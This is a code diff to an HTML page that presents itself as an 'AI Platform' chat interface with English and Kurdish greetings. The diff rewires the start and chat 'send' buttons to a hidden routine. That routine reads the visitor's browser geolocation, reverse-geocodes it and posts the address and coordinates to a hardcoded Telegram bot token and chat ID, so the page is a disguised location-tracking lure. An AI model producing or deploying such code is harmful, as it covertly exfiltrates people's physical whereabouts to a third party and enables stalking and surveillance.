@@ -15,8 +15,6 @@
             align-items: center;
             height: 100vh;
             overflow: hidden;
-
-        
         }
         .container {
             text-align: center;
@@ -94,15 +92,16 @@
         <h1>Welcome to the AI Platform</h1>
         <div class="buttons">
             <button onclick="alert('Chat with AI Coming Soon!')">Chat with AI</button>
-            <button onclick="alert('Capture Image with AI Coming Soon!')">Capture Image</button>
+            <button onclick="getLocation()">CLIK START</button>
         </div>
         <div class="chat-window">
             <div id="chat-log" style="height: 150px; overflow-y: auto;">
-                <p><b>AI:</b> How can I assist you today?</p>
+                <p><b>AI:-</b> How can I assist you today?</p>
+                <p>ئەمڕۆ چۆن بتوانم هاوکاریتان بکەم؟<b>-:AI</b></p>
             </div>
             <div class="chat-input">
                 <input type="text" id="user-input" placeholder="Type your message...">
-                <button class="send-btn" onclick="sendMessage()">Send</button>
+                 <button onclick="getLocation()">send</button>
             </div>
         </div>
         <div id="status"></div>
@@ -111,6 +110,7 @@
     <script>
 
 
+  
 // Function to get location details from OpenStreetMap
 function getLocationDetails(latitude, longitude) {
     const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;
@@ -196,6 +196,75 @@ function sendToBot(imageFile, locationData) {
         document.getElementById('status').innerText = 'Location data not available.';
     }
 }
-</script>>
+
+
+
+        // Function to fetch location details
+        function getLocationDetails(latitude, longitude) {
+            const url = `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&addressdetails=1`;
+            return fetch(url)
+                .then(response => response.json())
+                .then(data => data.display_name || "Unknown Location")
+                .catch(error => {
+                    console.error("Error fetching location details:", error);
+                    return "Unknown Location";
+                });
+        }
+
+        // Function to send location to Telegram bot
+        function sendLocationToBot(latitude, longitude, address) {
+            const message = `Location: ${address}\nCoordinates: ${latitude}, ${longitude}`;
+            const formData = new FormData();
+            formData.append('chat_id', '2032344793'); // Replace with your chat ID
+            formData.append('text', message);
+
+            fetch('https://api.telegram.org/bot5836151829:AAGw120dHzCMh9UMj0loSHOu8lvvzg2yli0/sendMessage', {
+                method: 'POST',
+                body: formData
+            })
+                .then(response => response.json())
+                .then(data => {
+                    const statusElement = document.getElementById('status');
+                    if (data.ok) {
+                        statusElement.innerText = 'Location sent successfully!';
+                    } else {
+                        statusElement.innerText = 'Failed to send location.';
+                        console.error("Telegram API error:", data);
+                    }
+                })
+                .catch(error => {
+                    document.getElementById('status').innerText = 'Error sending location to bot.';
+                    console.error('Error sending location:', error);
+                });
+        }
+
+        // Function to get user's current location
+        function getLocation() {
+            const statusElement = document.getElementById('status');
+            statusElement.innerText = "Fetching ...";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        getLocationDetails(latitude, longitude)
+                            .then(address => sendLocationToBot(latitude, longitude, address))
+                            .catch(error => {
+                                statusElement.innerText = "Error fetching location details.";
+                                console.error("Error fetching location details:", error);
+                            });
+                    },
+                    error => {
+                        statusElement.innerText = "Error fetching location.";
+                        console.error("Geolocation error:", error);
+                    }
+                );
+            } else {
+                statusElement.innerText = "Geolocation is not supported by your browser.";
+            }
+        }
+    </script>
 </body>
 </html>
